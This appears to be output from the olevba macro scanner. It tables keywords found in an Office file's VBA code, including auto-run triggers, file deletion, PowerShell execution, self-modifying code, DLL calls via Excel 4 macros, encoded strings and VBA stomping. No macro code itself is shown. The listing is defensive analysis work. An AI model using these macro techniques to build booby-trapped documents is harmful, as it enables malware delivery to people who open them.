|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Register            |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

